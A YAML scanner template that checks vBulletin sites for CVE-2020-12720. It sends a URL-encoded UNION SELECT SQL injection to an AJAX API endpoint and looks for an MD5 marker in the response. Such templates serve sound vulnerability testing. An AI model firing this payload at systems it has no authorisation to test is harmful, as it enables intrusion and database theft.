name: poc-yaml-vbulletin-cve-2020-12720
binding: cf7670ae-ff6f-4da2-9e9a-3036034a6359
manual: true
detail:
    author: 2husky
    links:
        - https://packetstormsecurity.com/files/157904/vBulletin-5.6.1-SQL-Injection.html
    vulnerability:
        id: CT-66878
        level: critical
transport: http
set:
    f1: randomLowercase(5)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /ajax/api/content_infraction/getIndexableContent
            headers:
                Accept: '*/*'
                Content-Type: application/x-www-form-urlencoded
                X-Requested-With: XMLHttpRequest
            body: nodeId%5Bnodeid%5D=1%20union%20select%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2Cmd5('{{f1}}')%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27--+-
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(bytes(md5(f1)))
expression: r0()
